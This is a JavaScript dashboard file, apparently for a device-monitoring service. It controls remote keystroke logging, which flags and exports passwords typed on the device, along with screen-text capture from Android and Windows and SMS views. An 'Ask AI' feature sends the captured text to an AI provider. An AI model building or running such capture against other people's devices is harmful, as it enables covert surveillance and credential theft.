socket.on('sms_update', d => { if (d.deviceId === selectedDeviceId) loadSms(d.deviceId); });

// ── Keylog ────────────────────────────────────────────────────────────────

let _keylogActive = false;
const _keylogDayCache = new Map(); // dateKey → entries[]

var loadKeylogs = async function(deviceId) {
  if (!deviceId) return;
  const container = document.getElementById('keylog-list');
  if (!container) return;
  container.innerHTML = '<p class="text-muted small">Loading…</p>';
  try {
    const entries = await fetch(`/api/devices/${deviceId}/keylogs`).then(r => r.json());
    if (deviceId !== selectedDeviceId) return; // device switched mid-fetch — drop stale response
    renderKeylogEntries(entries);
  } catch (_) { container.innerHTML = '<p class="text-danger small">Failed to load.</p>'; }
}

function renderKeylogEntries(entries) {
  const container = document.getElementById('keylog-list');
  if (!container) return;
  if (!entries.length) {
    container.innerHTML = '<p class="text-muted small">No keylog data yet. Click Start to begin recording, then type on the device.</p>';
    return;
  }

  // Group entries by calendar date (local time)
  _keylogDayCache.clear();
  const byDate = new Map();
  for (const e of entries) {
    const d = new Date(e.ts);
    const dateKey = d.toLocaleDateString([], { year: 'numeric', month: '2-digit', day: '2-digit' });
    const dateLabel = d.toLocaleDateString([], { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' });
    if (!byDate.has(dateKey)) byDate.set(dateKey, { label: dateLabel, entries: [] });
    byDate.get(dateKey).entries.push(e);
  }
  for (const [k, v] of byDate) _keylogDayCache.set(k, v);

  container.innerHTML = [...byDate.entries()].map(([dateKey, { label, entries: dayEntries }]) => {
    // Group consecutive entries within the day by app
    const groups = [];
    for (const e of dayEntries) {
      const last = groups[groups.length - 1];
      if (last && last.app === e.app) last.entries.push(e);
      else groups.push({ app: e.app, entries: [e] });
    }
    const appCards = groups.map(g => {
      const appShort = g.app.split('.').pop();
      const rows = g.entries.map(e => {
        const time = new Date(e.ts).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' });
        const hint = e.hint ? `<span class="badge bg-secondary me-1" style="font-size:.65rem">${esc(e.hint)}</span>` : '';
        const pwBadge = e.pw ? `<span class="badge bg-danger me-1" style="font-size:.65rem">password</span>` : '';
        return `<div class="py-1 border-bottom" style="font-size:.85rem">
          <span class="text-muted me-2" style="font-size:.75rem">${time}</span>${hint}${pwBadge}<span class="font-monospace">${esc(e.text)}</span>
        </div>`;
      }).join('');
      return `<div class="card mb-2" style="background:#1e1e2e;border-color:#313244">
        <div class="card-header py-1 px-2 d-flex justify-content-between align-items-center" style="background:#181825;font-size:.8rem">
          <span><i class="bi bi-app me-1 text-primary"></i><strong>${esc(appShort)}</strong></span>
          <small class="text-muted">${esc(g.app)}</small>
        </div>
        <div class="card-body p-2">${rows}</div>
      </div>`;
    }).join('');
    const colId  = 'kl-day-' + dateKey.replace(/\//g, '-');
    const isOpen = _openDayGroups.has(colId);
    const safeKey = dateKey.replace(/'/g, '');
    return `<div class="mb-3">
      <div class="d-flex align-items-center gap-2 mb-2">
        <div class="d-flex align-items-center gap-1 flex-shrink-0" role="button"
             data-bs-toggle="collapse" data-bs-target="#${colId}" aria-expanded="${isOpen}"
             style="cursor:pointer">
          <span class="badge bg-secondary px-2 py-1" style="font-size:.75rem;white-space:nowrap">
            <i class="bi bi-calendar3 me-1"></i>${esc(label)}
            <i class="bi bi-chevron-${isOpen ? 'up' : 'down'} ms-1" style="font-size:.6rem"></i>
          </span>
        </div>
        <button class="btn btn-outline-secondary btn-sm py-0 px-1 flex-shrink-0" style="font-size:.7rem"
          onclick="downloadKeylogDay('${safeKey}')" title="Download this day's log">
          <i class="bi bi-download"></i>
        </button>
        <hr class="flex-grow-1 m-0" style="border-color:rgba(255,255,255,.12)">
      </div>
      <div class="collapse${isOpen ? ' show' : ''}" id="${colId}">${appCards}</div>
    </div>`;
  }).join('');
}

function startKeylog(btn) {
  if (!deviceOnlineOrWarn()) return;
  _keylogActive = true;
  const _kdev = deviceCache.get(selectedDeviceId); if (_kdev) _kdev.keylog_active = 1;
  sendCmd('start_keylog', {});
  document.getElementById('btn-keylog-start')?.classList.add('d-none');
  document.getElementById('btn-keylog-stop')?.classList.remove('d-none');
}

function stopKeylog(btn) {
  _keylogActive = false;
  const _kdev = deviceCache.get(selectedDeviceId); if (_kdev) _kdev.keylog_active = 0;
  sendCmd('stop_keylog', {});
  document.getElementById('btn-keylog-stop')?.classList.add('d-none');
  document.getElementById('btn-keylog-start')?.classList.remove('d-none');
}

async function downloadKeylogs(deviceId) {
  if (!deviceId) return;
  try {
    const entries = await fetch(`/api/devices/${deviceId}/keylogs`).then(r => r.json());
    if (!entries.length) { alert('No keylog data to download.'); return; }

    // Group consecutive entries from the same app within a 3s window into one line
    const SESSION_GAP_MS = 3000;
    const sessions = [];
    for (const e of entries) {
      const last = sessions[sessions.length - 1];
      if (last && last.app === e.app && (e.ts - last.lastTs) < SESSION_GAP_MS) {
        last.text   += e.text.replace(/⌫/g, '[DEL]');
        last.lastTs  = e.ts;
        if (e.hint && !last.hint) last.hint = e.hint;
        if (e.pw) last.pw = true;
      } else {
        sessions.push({
          ts:     e.ts,
          lastTs: e.ts,
          app:    e.app,
          hint:   e.hint || '',
          pw:     !!e.pw,
          text:   e.text.replace(/⌫/g, '[DEL]'),
        });
      }
    }

    const lines = sessions.map(s => {
      const time = new Date(s.ts).toISOString();
      const hint = s.hint ? ` [${s.hint}]` : '';
      const pw   = s.pw   ? ' [password]' : '';
      return `${time}  ${s.app}${hint}${pw}\t${s.text}`;
    });

    const blob = new Blob([lines.join('\n')], { type: 'text/plain;charset=utf-8' });
    const url  = URL.createObjectURL(blob);
    const a    = document.createElement('a');
    a.href     = url;
    a.download = `keylog_${deviceId}_${Date.now()}.txt`;
    a.click();
    URL.revokeObjectURL(url);
  } catch (_) { alert('Failed to download keylog.'); }
}

function downloadKeylogDay(dateKey) {
  const day = _keylogDayCache.get(dateKey);
  if (!day || !day.entries.length) return;
  const SESSION_GAP_MS = 3000;
  const sessions = [];
  for (const e of day.entries) {
    const last = sessions[sessions.length - 1];
    if (last && last.app === e.app && (e.ts - last.lastTs) < SESSION_GAP_MS) {
      last.text  += e.text.replace(/⌫/g, '[DEL]');
      last.lastTs = e.ts;
      if (e.hint && !last.hint) last.hint = e.hint;
      if (e.pw) last.pw = true;
    } else {
      sessions.push({ ts: e.ts, lastTs: e.ts, app: e.app, hint: e.hint || '', pw: !!e.pw, text: e.text.replace(/⌫/g, '[DEL]') });
    }
  }
  const lines = sessions.map(s => {
    const time = new Date(s.ts).toISOString();
    const hint = s.hint ? ` [${s.hint}]` : '';
    const pw   = s.pw   ? ' [password]' : '';
    return `${time}  ${s.app}${hint}${pw}\t${s.text}`;
  });
  const blob = new Blob([lines.join('\n')], { type: 'text/plain;charset=utf-8' });
  const url  = URL.createObjectURL(blob);
  const a    = document.createElement('a');
  a.href     = url;
  a.download = `keylog_${selectedDeviceId}_${dateKey.replace(/\//g, '-')}.txt`;
  a.click();
  URL.revokeObjectURL(url);
}

async function clearKeylogs(deviceId) {
  if (!deviceId) return;
  if (!confirm('Delete all keylog data for this device?')) return;
  try {
    await fetch(`/api/devices/${deviceId}/keylogs`, { method: 'DELETE' });
    document.getElementById('keylog-list').innerHTML =
      '<p class="text-muted small">Keylog cleared.</p>';
  } catch (_) { alert('Failed to clear keylog.'); }
}

socket.on('keylog_update', d => {
  if (d.deviceId !== selectedDeviceId) return;
  // Prepend live entries to current display
  const container = document.getElementById('keylog-list');
  if (!container) return;
  // Re-fetch to keep display in sync with server order
  loadKeylogs(selectedDeviceId);
});

// ── Screen Text ───────────────────────────────────────────────────────────

let _screenTextActive = false;
// Latest screen-text entries currently rendered in the tab (both ZK-decrypted and
// plaintext paths funnel through renderScreenTextEntries). NOTE: this is only the
// capped display window (~200 non-ZK / ~2000 ZK). "Ask AI" does NOT read this — it
// fetches the FULL retained history itself (see _fetchAllScreenText) so it can
// submit everything not previously sent, regardless of the display cap.
let _lastScreenTextEntries = [];

// Pagination state for the Screen Text tab. The initial load shows the newest
// SCREEN_TEXT_PAGE snapshots; "Load older" pages back through the 30-day history in
// the same increments via a ?before=<ts> cursor (server-side, works for ZK + plaintext).
const SCREEN_TEXT_PAGE = 500;
let _screenTextEntries  = [];   // full accumulated set across all loaded pages
let _screenTextOldestTs = 0;    // cursor: ts of the oldest entry currently loaded
let _screenTextHasMore  = false;
let _screenTextLoadingOlder = false;

// Fetch one page of screen-text, normalizing both the plaintext array response and
// the ZK {zk:true,rows} response into the {id,ts,timestamp,pkg,texts} shape that
// renderScreenTextEntries consumes. `before`=0 fetches the newest page; a ms timestamp
// pages older. Returns { entries, isZk, noKey?, rows? }.
async function _fetchScreenTextPage(deviceId, before) {
  const qs = new URLSearchParams({ limit: String(SCREEN_TEXT_PAGE) });
  if (before) qs.set('before', String(before));
  const resp = await fetch(`/api/devices/${deviceId}/screen-text?${qs}`).then(r => r.json());
  if (resp && resp.zk) {
    if (!window._zkPrivKey) return { isZk: true, noKey: true, rows: resp.rows, entries: [] };
    const dec = await _zkRows(resp.rows);
    return { isZk: true, entries: dec.map(p => ({
      id: p._id, timestamp: p._ts || p.ts, ts: p._ts || p.ts, pkg: p.pkg || '', texts: p.texts || [],
    })) };
  }
  const arr = Array.isArray(resp) ? resp : [];
  return { isZk: false, entries: arr.map(e => ({
    id: e.id, timestamp: e.ts, ts: e.ts, pkg: e.pkg || '', texts: e.texts || [],
  })) };
}

function _screenTextOldest(entries) {
  let m = Infinity;
  for (const e of entries) { const t = e.ts || e.timestamp || 0; if (t && t < m) m = t; }
  return isFinite(m) ? m : 0;
}

// Show/hide + reset the "Load older" button beneath the screen-text list.
function _setScreenTextLoadMore(show) {
  const btn = document.getElementById('btn-screentext-older');
  if (!btn) return;
  btn.disabled = false;
  btn.innerHTML = '<i class="bi bi-arrow-down-circle me-1"></i>Load older';
  btn.classList.toggle('d-none', !show);
}

async function loadScreenText(deviceId) {
  if (!deviceId) return;
  const container = document.getElementById('screentext-list');
  if (!container) return;
  container.innerHTML = '<p class="text-muted small">Loading…</p>';
  _screenTextEntries = []; _screenTextOldestTs = 0; _screenTextHasMore = false;
  try {
    const res = await _fetchScreenTextPage(deviceId, 0);
    if (deviceId !== selectedDeviceId) return; // device switched mid-fetch — drop stale response
    if (res.noKey) { zkNoKeyMsg(container, 'Screen text', res.rows); _setScreenTextLoadMore(false); return; }
    _screenTextEntries  = res.entries;
    _screenTextOldestTs = _screenTextOldest(res.entries);
    _screenTextHasMore  = res.entries.length >= SCREEN_TEXT_PAGE;
    renderScreenTextEntries(_screenTextEntries);
    _setScreenTextLoadMore(_screenTextHasMore);
  } catch (_) { container.innerHTML = '<p class="text-danger small">Failed to load.</p>'; }
}

async function loadOlderScreenText() {
  const deviceId = selectedDeviceId;
  if (!deviceId || _screenTextLoadingOlder || !_screenTextHasMore || !_screenTextOldestTs) return;
  _screenTextLoadingOlder = true;
  const btn = document.getElementById('btn-screentext-older');
  if (btn) { btn.disabled = true; btn.innerHTML = '<span class="spinner-border spinner-border-sm me-1"></span>Loading…'; }
  try {
    const res = await _fetchScreenTextPage(deviceId, _screenTextOldestTs);
    if (deviceId !== selectedDeviceId) return; // device switched mid-fetch
    const seen  = new Set(_screenTextEntries.map(e => e.id));
    const added = res.entries.filter(e => !seen.has(e.id));
    _screenTextEntries = _screenTextEntries.concat(added);
    if (added.length) _screenTextOldestTs = _screenTextOldest(_screenTextEntries);
    // More remains only if this page came back full AND advanced the cursor.
    _screenTextHasMore = res.entries.length >= SCREEN_TEXT_PAGE && added.length > 0;
    renderScreenTextEntries(_screenTextEntries);
  } finally {
    _screenTextLoadingOlder = false;
    _setScreenTextLoadMore(_screenTextHasMore);
  }
}

function renderScreenTextEntries(entries, containerId = 'screentext-list', dayIdPrefix = 'st-day') {
  const container = document.getElementById(containerId);
  if (!container) return;
  // Android tab only: snapshot for "Ask AI" + its button state. The Windows RA raw view
  // renders read-only into its own container and must not clobber this snapshot.
  if (containerId === 'screentext-list') {
    _lastScreenTextEntries = Array.isArray(entries) ? entries : [];
    _aiUpdateButtonState();
  }
  if (!entries || !entries.length) {
    container.innerHTML = '<p class="text-muted small">No screen text data yet. Click Start to begin capturing.</p>';
    return;
  }

  // Newest first: sort descending by timestamp before grouping so both the date
  // groups and the entries within each day are ordered newest → oldest.
  entries = [...entries].sort((a, b) =>
    new Date(b.timestamp || b.ts).getTime() - new Date(a.timestamp || a.ts).getTime());

  // Group by calendar date
  const byDate = new Map();
  for (const e of entries) {
    const d = new Date(e.timestamp || e.ts);
    const dateKey   = d.toLocaleDateString([], { year: 'numeric', month: '2-digit', day: '2-digit' });
    const dateLabel = d.toLocaleDateString([], { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' });
    if (!byDate.has(dateKey)) byDate.set(dateKey, { label: dateLabel, entries: [] });
    byDate.get(dateKey).entries.push(e);
  }

  container.innerHTML = [...byDate.entries()].map(([dateKey, { label, entries: dayEntries }]) => {
    const cards = dayEntries.map(e => {
      const time    = new Date(e.timestamp || e.ts).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' });
      const appShort = (e.pkg || '').split('.').pop();
      const texts   = Array.isArray(e.texts) ? e.texts : (e.data?.texts || []);
      const rows    = texts.map(t => {
        const text = typeof t === 'string' ? t : (t.t || '');
        const cls  = typeof t === 'object' && t.c ? `<span class="badge bg-dark text-secondary me-1" style="font-size:.65rem">${esc(t.c)}</span>` : '';
        return `<div class="py-1 border-bottom" style="font-size:.83rem">${cls}<span>${esc(text)}</span></div>`;
      }).join('');
      return `<div class="card mb-2" style="background:#1e1e2e;border-color:#313244">
        <div class="card-header py-1 px-2 d-flex justify-content-between align-items-center" style="background:#181825;font-size:.8rem">
          <span><i class="bi bi-app me-1 text-info"></i><strong>${esc(appShort)}</strong></span>
          <span class="d-flex gap-2 align-items-center">
            <small class="text-muted">${esc(e.pkg || '')}</small>
            <small class="text-muted">${time}</small>
          </span>
        </div>
        <div class="card-body p-2">${rows || '<span class="text-muted small">No text nodes</span>'}</div>
      </div>`;
    }).join('');

    const colId  = dayIdPrefix + '-' + dateKey.replace(/\//g, '-');
    const isOpen = _openDayGroups.has(colId);
    return `<div class="mb-3">
      <div class="d-flex align-items-center gap-2 mb-2">
        <div class="d-flex align-items-center gap-1 flex-shrink-0" role="button"
             data-bs-toggle="collapse" data-bs-target="#${colId}" aria-expanded="${isOpen}"
             style="cursor:pointer">
          <span class="badge bg-secondary px-2 py-1" style="font-size:.75rem;white-space:nowrap">
            <i class="bi bi-calendar3 me-1"></i>${esc(label)}
            <i class="bi bi-chevron-${isOpen ? 'up' : 'down'} ms-1" style="font-size:.6rem"></i>
          </span>
        </div>
        <hr class="flex-grow-1 m-0" style="border-color:rgba(255,255,255,.12)">
      </div>
      <div class="collapse${isOpen ? ' show' : ''}" id="${colId}">${cards}</div>
    </div>`;
  }).join('');
}

function startScreenText() {
  if (!deviceOnlineOrWarn()) return;
  _screenTextActive = true;
  const _stdev = deviceCache.get(selectedDeviceId); if (_stdev) _stdev.screen_text_active = 1;
  sendCmd('start_screen_text', {});
  document.getElementById('btn-screentext-start')?.classList.add('d-none');
  document.getElementById('btn-screentext-stop')?.classList.remove('d-none');
}

function stopScreenText() {
  _screenTextActive = false;
  const _stdev = deviceCache.get(selectedDeviceId); if (_stdev) _stdev.screen_text_active = 0;
  sendCmd('stop_screen_text', {});
  document.getElementById('btn-screentext-stop')?.classList.add('d-none');
  document.getElementById('btn-screentext-start')?.classList.remove('d-none');
}

async function downloadScreenText(deviceId) {
  if (!deviceId) return;
  try {
    // Full retained history (not the ~200/2000-row display window), ZK-decrypted
    // client-side when applicable — so the .txt export contains EVERYTHING.
    const entries = await _fetchAllScreenText(deviceId);
    if (entries === null) { alert('Unlock this device’s private data first (enter your key), then download.'); return; }
    if (!entries.length) { alert('No screen text data to download.'); return; }
    const lines = entries.map(e => {
      const time  = new Date(e.timestamp || e.ts).toISOString();
      const texts = Array.isArray(e.texts) ? e.texts : (e.data?.texts || []);
      const flat  = texts.map(t => typeof t === 'string' ? t : (t.t || '')).join(' | ');
      return `${time}  ${e.pkg || ''}\t${flat}`;
    });
    const blob = new Blob([lines.join('\n')], { type: 'text/plain;charset=utf-8' });
    const url  = URL.createObjectURL(blob);
    const a    = document.createElement('a');
    a.href     = url;
    a.download = `screentext_${deviceId}_${Date.now()}.txt`;
    a.click();
    URL.revokeObjectURL(url);
  } catch (_) { alert('Failed to download screen text.'); }
}

async function clearScreenText(deviceId) {
  if (!deviceId) return;
  const confirmed = await new Promise(resolve => {
    let done = false;
    showConfirm({
      title: 'Clear Screen Text',
      body:
        `<p>This permanently deletes <strong>all captured screen-text data</strong> for this device.</p>` +
        `<p class="mb-0">Saved AI reports and memory are <strong>not</strong> affected. This cannot be undone.</p>`,
      okLabel: 'Clear Screen Text',
      okClass: 'btn-danger',
      onConfirm: () => { done = true; resolve(true); },
    });
    const el = document.getElementById('confirmModal');
    el.addEventListener('hidden.bs.modal', function h() {
      el.removeEventListener('hidden.bs.modal', h);
      if (!done) resolve(false);
    });
  });
  if (!confirmed) return;
  try {
    await fetch(`/api/devices/${deviceId}/screen-text`, { method: 'DELETE' });
    document.getElementById('screentext-list').innerHTML =
      '<p class="text-muted small">Screen text data cleared.</p>';
  } catch (_) { showToast('Failed to clear screen text.', 'danger'); }
}

socket.on('screen_text_update', d => {
  if (d.deviceId !== selectedDeviceId) return;
  // Windows RA tab open? Refresh its raw list too. Debounced — the drain poller emits
  // one event per captured batch, several of which can land within a single minute.
  if (!document.getElementById('tab-ra-screentext')?.classList.contains('d-none')) {
    clearTimeout(_raStReloadTimer);
    _raStReloadTimer = setTimeout(raLoadScreenText, 2000);
  }
  const container = document.getElementById('screentext-list');
  if (!container) return;
  // Don't yank the view back to the newest page if the user has paged into older
  // history (they can hit the refresh button to jump back to live).
  if (_screenTextEntries.length > SCREEN_TEXT_PAGE) return;
  loadScreenText(selectedDeviceId);
});

// ── Windows RA tab — raw captured text (same store as the Android Screen Text tab) ──
// The drain poller stores Windows UI-Automation captures into screen_text_entries exactly
// like Android's capture, so the same /screen-text endpoint + _fetchScreenTextPage serve
// this view; only the container and pagination state differ.
let _raStReloadTimer = null;
const RA_SCREEN_TEXT_PAGE = 500;
let _raStEntries = [];          // accumulated entries across loaded pages
let _raStOldestTs = 0;          // ?before= cursor for paging older history
let _raStHasMore = false;
let _raStLoadingOlder = false;
function _setRaStLoadMore(show) {
  const btn = document.getElementById('ra-btn-screentext-older');
  if (!btn) return;
  btn.disabled = false;
  btn.innerHTML = '<i class="bi bi-arrow-down-circle me-1"></i>Load older';
  btn.classList.toggle('d-none', !show);
}
async function raLoadScreenText() {
  const deviceId = selectedDeviceId;
  if (!deviceId) return;
  const container = document.getElementById('ra-screentext-list');
  if (!container) return;
  container.innerHTML = '<p class="text-muted small">Loading…</p>';
  _raStEntries = []; _raStOldestTs = 0; _raStHasMore = false;
  try {
    const res = await _fetchScreenTextPage(deviceId, 0);
    if (deviceId !== selectedDeviceId) return; // device switched mid-fetch — drop stale response
    if (res.noKey) { zkNoKeyMsg(container, 'Screen text', res.rows); _setRaStLoadMore(false); return; }
    _raStEntries    = res.entries;
    _raStOldestTs   = _screenTextOldest(res.entries);
    _raStHasMore    = res.entries.length >= SCREEN_TEXT_PAGE;
    renderScreenTextEntries(_raStEntries, 'ra-screentext-list', 'ra-st-day');
    _setRaStLoadMore(_raStHasMore);
  } catch (_) { container.innerHTML = '<p class="text-danger small">Failed to load.</p>'; }
}
async function raLoadOlderScreenText() {
  const deviceId = selectedDeviceId;
  if (!deviceId || _raStLoadingOlder || !_raStHasMore || !_raStOldestTs) return;
  _raStLoadingOlder = true;
  const btn = document.getElementById('ra-btn-screentext-older');
  if (btn) { btn.disabled = true; btn.innerHTML = '<span class="spinner-border spinner-border-sm me-1"></span>Loading…'; }
  try {
    const res = await _fetchScreenTextPage(deviceId, _raStOldestTs);
    if (deviceId !== selectedDeviceId) return;
    const seen  = new Set(_raStEntries.map(e => e.id));
    const added = res.entries.filter(e => !seen.has(e.id));
    _raStEntries = _raStEntries.concat(added);
    if (added.length) _raStOldestTs = _screenTextOldest(_raStEntries);
    _raStHasMore = res.entries.length >= SCREEN_TEXT_PAGE && added.length > 0;
    renderScreenTextEntries(_raStEntries, 'ra-screentext-list', 'ra-st-day');
  } finally {
    _raStLoadingOlder = false;
    _setRaStLoadMore(_raStHasMore);
  }
}

// ── Ask AI (Screen Text → AI) ───────────────────────────────────────────────
// Consent-gated. Dumps only the NEW (previously un-sent) screen text to the AI
// provider for analysis via the server proxy, then opens a multi-turn chat. The plaintext
// leaves the owner's exclusive control and is sent to a third party — every
// dispatch is gated behind an explicit confirmation + a local rate limiter.

let _aiChat = null; // { deviceId, logs, pendingMark:[], history:[{role,text}] } — persists after modal close so the chat can be reopened

const AI_RATE_MAX = 5;
const AI_RATE_WINDOW_MS = 15 * 60 * 1000;

// ── localStorage bloat control ────────────────────────────────────────────────
// The ai_st_sent / ai_st_chat / ai_logs_sent:<kind> families are all keyed per-device and never
// got cleaned up when a device was removed/re-enrolled — over the life of an account that's an
// unbounded number of orphaned keys, and per-device dedup sets/chat history that never trim ARE
// individually unbounded too. Together that's what runs a browser's localStorage quota out
// (breaking anything else that writes to it — see the notif-bell bug this traced back to).
// Runs once per page load, keyed off the just-fetched authoritative device list.
let _aiStoragePruned = false;
function _pruneStaleAiLocalStorage(deviceIds) {
  if (_aiStoragePruned) return;
  _aiStoragePruned = true;
  try {
    const known = new Set(deviceIds.map(String));
    const stale = [];
    for (let i = 0; i < localStorage.length; i++) {
      const key = localStorage.key(i);
      if (!key) continue;
      let deviceId = null;
      let m = key.match(/^ai_(?:st_sent|st_chat):(.+)$/);
      if (m) deviceId = m[1];
      else if ((m = key.match(/^ai_logs_sent:[^:]+:(.+)$/))) deviceId = m[1];
      if (deviceId !== null && !known.has(deviceId)) stale.push(key);
    }
    stale.forEach(k => { try { localStorage.removeItem(k); } catch {} });
    if (stale.length) console.log(`Pruned ${stale.length} stale AI localStorage key(s) for removed device(s)`);
  } catch (e) { console.warn('AI localStorage prune failed:', e.message); }
}

// Rate limiter — sliding window of dispatch timestamps in localStorage (global
// per browser; the shared AI key is also protected server-side).
function _aiRateTimes() {
  try { return JSON.parse(localStorage.getItem('ai_st_rate') || '[]'); } catch { return []; }
}
function _aiRatePrune() {
  const now = Date.now();
  const arr = _aiRateTimes().filter(t => now - t < AI_RATE_WINDOW_MS);
  try { localStorage.setItem('ai_st_rate', JSON.stringify(arr)); } catch {}
  return arr;
}
function _aiRateRemainingMs() {
  const arr = _aiRatePrune();
  if (arr.length < AI_RATE_MAX) return 0;
  return Math.max(0, AI_RATE_WINDOW_MS - (Date.now() - Math.min(...arr)));
}
function _aiRateRecord() {
  const arr = _aiRatePrune();
  arr.push(Date.now());
  try { localStorage.setItem('ai_st_rate', JSON.stringify(arr)); } catch {}
}

// Deduplication — per-device set of screen-text entry keys already sent to the AI.
function _aiKeyOf(e) { return e.id != null ? String(e.id) : `${e.ts || e.timestamp}|${e.pkg || ''}`; }
function _aiSentKeys(deviceId) {
  try { return new Set(JSON.parse(localStorage.getItem(`ai_st_sent:${deviceId}`) || '[]')); }
  catch { return new Set(); }
}
function _aiMarkSent(deviceId, keys) {
  const set = _aiSentKeys(deviceId);
  keys.forEach(k => set.add(k));
  let arr = [...set];
  if (arr.length > 2000) arr = arr.slice(arr.length - 2000); // bound localStorage growth — this is a recent-dedup window, not an audit log
  try { localStorage.setItem(`ai_st_sent:${deviceId}`, JSON.stringify(arr)); } catch {}
}

function _aiFlatten(entries) {
  return entries.map(e => {
    const texts = Array.isArray(e.texts) ? e.texts : (e.data?.texts || []);
    const flat  = texts.map(t => typeof t === 'string' ? t : (t.t || '')).filter(Boolean).join(' | ');
    const time  = new Date(e.ts || e.timestamp).toISOString();
    return `[${time}] ${(e.pkg || '').split('.').pop()}: ${flat}`;
  }).filter(Boolean).join('\n');
}

// Fetch the COMPLETE retained screen-text history — independent of the display
// tab's 200/2000-row window (passes ?limit=all). Used by both "Ask AI" and the
// Download button. Honors ZK: decrypts client-side when the device is owner-
// encrypted. Returns a normalized entries array (same shape renderScreenTextEntries
// consumes), or null when a ZK device's private key isn't loaded (caller should ask
// the user to unlock first).
async function _fetchAllScreenText(deviceId) {
  let resp;
  try { resp = await fetch(`/api/devices/${deviceId}/screen-text?limit=all`).then(r => r.json()); }
  catch { return []; }
  let entries;
  if (!resp || !resp.zk) {
    entries = Array.isArray(resp) ? resp : [];
  } else {
    if (!window._zkPrivKey) return null;          // ZK device, no key → can't decrypt
    const dec = await _zkRows(resp.rows);
    entries = dec.map(p => ({
      id: p._id, timestamp: p._ts || p.ts, ts: p._ts || p.ts,
      pkg: p.pkg || '', texts: p.texts || [],
    }));
  }
  // Chronological (oldest → newest) so the flattened log reads as a timeline and,
  // if the server's generous size-cap is ever hit, the OLDEST is dropped and recent
  // activity is kept. Normalises the two source orders (non-ZK arrives oldest-first,
  // ZK arrives newest-first) into one.
  entries.sort((a, b) => (a.ts || a.timestamp || 0) - (b.ts || b.timestamp || 0));
  return entries;
}

// Reflect rate-limit cooldown on the button (per spec: disable + show remaining).
// Persist the conversation locally so it survives reloads / app restarts. Stored
// in localStorage = the WebView's app-local storage on the SentinelClient device
// (and the browser's local storage on desktop) — never sent to the server, so the
// zero-knowledge model is unaffected.
function _aiChatKey(deviceId) { return `ai_st_chat:${deviceId}`; }
function _aiPersist() {
  if (!_aiChat || !_aiChat.deviceId) return;
  try {
    // Bound both fields — an open-ended chat + raw log dump persisted on every turn was the
    // single biggest localStorage growth source (see _pruneStaleAiLocalStorage). Keeping the last
    // 60 turns and 20k chars of logs is plenty to resume a conversation sensibly.
    const boundedHistory = (_aiChat.history || []).slice(-60);
    const boundedLogs = (_aiChat.logs || '').slice(-20000);
    localStorage.setItem(_aiChatKey(_aiChat.deviceId), JSON.stringify({
      logs: boundedLogs,
      pendingMark: _aiChat.pendingMark || [],
      history: boundedHistory,
      isScheduledFollowUp: !!_aiChat.isScheduledFollowUp,
      scheduledDate: _aiChat.scheduledDate || null,
      scheduledResultAt: _aiChat.scheduledResultAt || null,
    }));
  } catch (_) {}
}
function _aiLoadChat(deviceId) {
  try {
    const o = JSON.parse(localStorage.getItem(_aiChatKey(deviceId)) || 'null');
    if (!o || !Array.isArray(o.history) || !o.history.length) return null;
    return {
      deviceId, logs: o.logs || '', pendingMark: o.pendingMark || [], history: o.history,
      isScheduledFollowUp: !!o.isScheduledFollowUp,
      scheduledDate: o.scheduledDate || null,
      scheduledResultAt: o.scheduledResultAt || null,
    };
  } catch (_) { return null; }
}
function _aiClearChat(deviceId) { try { localStorage.removeItem(_aiChatKey(deviceId)); } catch (_) {} }

function _aiHasChatFor(deviceId) {
  return !!(_aiChat && _aiChat.deviceId === deviceId && _aiChat.history && _aiChat.history.length);
}

function _aiUpdateButtonState() {
  const btn = document.getElementById('btn-screentext-ai');
  if (!btn) return;
  // Restore a persisted chat for the selected device (survives reload / app restart).
  if (selectedDeviceId && !_aiHasChatFor(selectedDeviceId)) {
    const persisted = _aiLoadChat(selectedDeviceId);
    if (persisted) _aiChat = persisted;
  }
  const hasChat = _aiHasChatFor(selectedDeviceId);
  const remMs   = _aiRateRemainingMs();
  // An existing chat can always be reopened (no data is sent on reopen), even
  // during cooldown. Cooldown only blocks STARTING a brand-new analysis.
  if (remMs > 0 && !hasChat) {
    btn.disabled = true;
    btn.innerHTML = `<i class="bi bi-hourglass-split me-1"></i>Wait ${Math.ceil(remMs / 60000)}m`;
    btn.title = 'AI rate limit reached (5 per 15 min). Please wait.';
  } else {
    btn.disabled = false;
    btn.innerHTML = hasChat
      ? '<i class="bi bi-stars me-1"></i>Open AI Chat'
      : '<i class="bi bi-stars me-1"></i>Ask AI';
    btn.title = hasChat
      ? 'Reopen the AI chat for this device'
      : 'Analyze new screen text with AI (sends data to a third party)';
  }
  // Keep the label fresh while a cooldown is ticking down.
  if (remMs > 0) {
    clearTimeout(window._aiRateTimer);
    window._aiRateTimer = setTimeout(_aiUpdateButtonState, Math.min(remMs + 500, 60000));
  }
}

// Mandatory privacy disclosure — styled confirm, resolves true only on explicit OK.
function _aiPrivacyConfirm() {
  return new Promise(resolve => {
    let done = false;
    showConfirm({
      title: '⚠️ Data Privacy Warning',
      body:
        `<p>Your screen text logs are currently <strong>locally encrypted and solely under your control</strong>.</p>` +
        `<p>Proceeding will <strong>decrypt and transmit the new screen text logs</strong> from this device to a ` +
        `third-party AI provider for analysis. They will no longer be exclusively ` +
        `readable by you, and may be processed on the provider's servers.</p>` +
        `<p class="mb-0"><strong>Only screen text</strong> from this device will be sent — no other data. Do you wish to proceed?</p>`,
      okLabel: 'Decrypt & Send to AI',
      okClass: 'btn-info',
      onConfirm: () => { done = true; resolve(true); },
    });
    const el = document.getElementById('confirmModal');
    el.addEventListener('hidden.bs.modal', function h() {
      el.removeEventListener('hidden.bs.modal', h);
      if (!done) resolve(false); // cancelled / dismissed
    });
  });
}

function _aiShowModal() {
  bootstrap.Modal.getOrCreateInstance(document.getElementById('aiScreenTextModal')).show();
  _aiRenderTranscript();
}

// "Ask AI" button — reopen the existing conversation for this device if one is
// already underway (so the chat can be reopened after closing), otherwise start
// a fresh analysis.
// Cap how much screen text is sent to the AI. A huge backlog (e.g. 10k+ entries) makes the
// upstream request time out at the gateway (502), so keep the MOST RECENT entries that fit a
// safe character budget (entries arrive chronological, so the recent ones are at the tail).
const AI_MAX_LOG_CHARS = 3000000;   // ~3M chars — fits a full day of screen text within the provider's token window
function _aiCapEntries(fresh) {
  const full = _aiFlatten(fresh);
  if (full.length <= AI_MAX_LOG_CHARS) return { capped: fresh, wasCapped: false, total: fresh.length };
  const kept = []; let size = 0;
